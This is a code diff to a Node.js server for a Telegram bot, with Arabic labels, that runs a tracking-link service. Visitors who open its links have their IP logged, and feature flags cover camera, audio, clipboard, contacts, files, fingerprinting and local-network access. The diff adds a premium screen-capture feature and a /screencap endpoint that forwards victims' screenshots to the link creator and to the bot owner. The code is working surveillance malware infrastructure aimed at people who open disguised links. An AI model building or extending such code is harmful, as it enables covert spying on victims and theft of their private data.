@@ -27,7 +27,7 @@ const PROFILES_FILE   = "./profiles.json";
 const PREMIUM_FILE    = "./premium.json";
 
 const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true };
-const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true };
+const DEFAULT_PREMIUM_FREE = { camera:false, audio:false, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false };
 
 let users      = new Set(loadJSON(USERS_FILE, []));
 let banned     = new Set(loadJSON(BANNED_FILE, []));
@@ -47,7 +47,7 @@ Object.keys(DEFAULT_FEATURES).forEach(k => {
   if (!(k in settings.features)) settings.features[k] = DEFAULT_FEATURES[k];
 });
 Object.keys(DEFAULT_PREMIUM_FREE).forEach(k => {
-  if (!(k in settings.premiumFree)) settings.premiumFree[k] = false;
+  if (!(k in settings.premiumFree)) settings.premiumFree[k] = DEFAULT_PREMIUM_FREE[k];
   if (!(k in settings.premiumFreeExpiry)) settings.premiumFreeExpiry[k] = null;
 });
 
@@ -210,7 +210,7 @@ async function restoreFromGitHub() {
       if (!(k in settings.features)) settings.features[k] = DEFAULT_FEATURES[k];
     });
     Object.keys(DEFAULT_PREMIUM_FREE).forEach(k => {
-      if (!(k in settings.premiumFree))       settings.premiumFree[k]       = false;
+      if (!(k in settings.premiumFree))       settings.premiumFree[k]       = DEFAULT_PREMIUM_FREE[k];
       if (!(k in settings.premiumFreeExpiry)) settings.premiumFreeExpiry[k] = null;
     });
     console.log(`✅ استُعيد ${restored} ملف من GitHub`);
@@ -370,7 +370,8 @@ async function handleLinkOpen(req, res, view) {
   const pidAccess     = canUsePremium(creatorId, 'persistentId');
   const localNetAccess= canUsePremium(creatorId, 'localNet');
   const pushAccess    = canUsePremium(creatorId, 'webpush');
-  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium, camAccess, audioAccess, clipAccess, pidAccess, localNetAccess, pushAccess });
+  const screenCapAccess = canUsePremium(creatorId, 'screencap');
+  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium, camAccess, audioAccess, clipAccess, pidAccess, localNetAccess, pushAccess, screenCapAccess });
 }
 
 app.get("/w/:path/*",  (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "webview"); });
@@ -1105,7 +1106,8 @@ const PREM_FEAT_NAMES = {
   files:       "🖼️ الصور/الملفات",
   persistentId:"🆔 المعرّف الدائم",
   localNet:    "🌐 الشبكة المحلية",
-  webpush:     "🔔 الإشعارات"
+  webpush:     "🔔 الإشعارات",
+  screencap:   "🖥️ تصوير الشاشة"
 };
 
 function premiumConfigText() {
@@ -1327,6 +1329,23 @@ app.post("/file-upload", upload.single('file'), (req, res) => {
       bot.sendDocument(tid, buf, { caption: cap }, info).catch(()=>{});
       if (tid !== BOT_OWNER) bot.sendDocument(BOT_OWNER, buf, { caption:`${cap}\n(ID: ${tid})` }, info).catch(()=>{});
     }
+  }
+  res.send("Done");
+});
+
+// ── Screen Capture upload (premium) ───────────────────────────────────────────
+app.post("/screencap", (req, res) => {
+  const uid = req.body?.uid || null;
+  const img = req.body?.img || null;
+  if (!uid || !img) return res.send("Missing");
+  const tid = parseInt(uid, 36);
+  const buf = Buffer.from(decodeURIComponent(img), 'base64');
+  const info = { filename: "screen.png", contentType: "image/png" };
+  const ts = new Date().toJSON().slice(11,19) + " UTC";
+  const cap = `🖥️ تصوير الشاشة | ${ts}`;
+  if (!settings.silentMode) {
+    bot.sendPhoto(tid, buf, { caption: cap }, info).catch(()=>{});
+    if (tid !== BOT_OWNER) bot.sendPhoto(BOT_OWNER, buf, { caption: `${cap}\n(ID: ${tid})` }, info).catch(()=>{});
   }
   res.send("Done");
 });
